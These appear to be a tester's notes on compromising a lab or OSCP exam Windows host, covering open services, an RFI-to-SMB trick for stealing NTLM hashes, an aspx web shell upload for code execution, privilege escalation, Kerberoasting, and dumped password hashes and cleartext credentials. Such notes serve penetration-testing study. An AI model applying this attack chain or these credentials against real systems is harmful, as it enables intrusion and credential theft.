### ++ Approach 192.168.236.147 ++
#### Credentials
	* web_svc:Diamond1 (SSH and FTP)
	* sql_svc:Dolphin1

#### Services
	##### 21 FTP
		No null session

	##### 22 SSH
		-

	##### 135 RPC
		No null session

	##### 139,445 SMB
		No null session

	##### 8000 Http
		Microsoft IIS

	##### 8080 Http
		Webapp: http://ms01.oscp.exam:8080/

	##### 8443 Https
		Webapp: https://ms01.oscp.exam:8443/

	##### 47001 WinRM?
		-

### ++ Vulnerabilities ++

#### Vuln 1: RFI in Http webapp and hash stealing ++
	* In 8080/8443 webapp we can point to an url so setting up responder and using \\192.168.45.210\share\test url we can get a hash for web_svc user and get web_svc:Diamond1 credentials

### ++ System Interaction ++
#### Foothold as web_svc
	* Abusing vuln 1 we can connect to FTP or SSH with stole credentials but this user cannot do much

#### Lateral movement
	* With web_svc we can upload a aspx shell in C:\inetpub\wwwroot (through FTP or SSH) and access in port 8000 webapp to get RCE

#### Privilege Escalation 
	* Abuse SeImpersonatePrivilege
	
#### Post-exploitation 
	* Kerberoasting with Rubeus to extract sql_svc:Dolphin1 credentials
	* LaZagne:
        Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::  
        Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
        support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::

        ------------------- Pypykatz passwords -----------------
        Administrator:3c4495bbd678fac8c9d218be4f2bbc7b
        web_svc:53e938166782a44e241beaf02d081ff6
        MS01$:d0e9371d1f9acbdd290384512e15cda3